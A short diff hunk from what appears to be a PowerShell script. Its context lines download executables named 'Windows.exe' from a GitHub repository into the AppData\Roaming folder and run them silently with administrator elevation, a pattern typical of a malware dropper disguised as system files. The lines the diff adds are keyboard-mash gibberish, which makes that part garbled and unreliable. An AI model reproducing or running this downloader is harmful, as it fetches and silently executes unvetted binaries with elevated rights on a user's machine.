@@ -5,3 +5,7 @@ Invoke-WebRequest -Uri "https://github.com/nomitaned/e/raw/refs/heads/main/Windo
 Invoke-WebRequest -Uri "https://github.com/nomitaned/e/raw/refs/heads/main/Windows.exe" -OutFile "$env:USERPROFILE\AppData\Roaming\Subdir\Windows.exe"
 Start-Process "$env:USERPROFILE\Appdata\Roaming\Windows32.exe" -ArgumentList '/silent' -Wait -Verb RunAs
 Start-Process "$env:USERPROFILE\Appdata\Roaming\Subdir\Windows.exe" -ArgumentList '/silent' -Wait -Verb RunAs
+hsadjkaskdhkasdhk
+iqwhjdaiuhasidbjkashdjkashdjahsdk
+jasdhasdjosadjiojdasop
+ahsdjashdahsdjkhaskjdh
